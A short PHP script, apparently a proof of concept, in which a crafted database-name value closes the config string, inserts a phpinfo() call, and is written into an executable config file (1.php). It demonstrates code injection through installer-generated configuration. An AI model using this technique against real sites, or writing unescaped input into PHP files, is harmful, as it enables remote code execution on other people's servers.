<?php
$db_name="1');?><?php phpinfo();?>//";
$config="<?php
/*数据库配置*/
\$dbconfig=array(
	'dbname' => '{$db_name}' //数据库名
);
?>";
file_put_contents('1.php',$config);
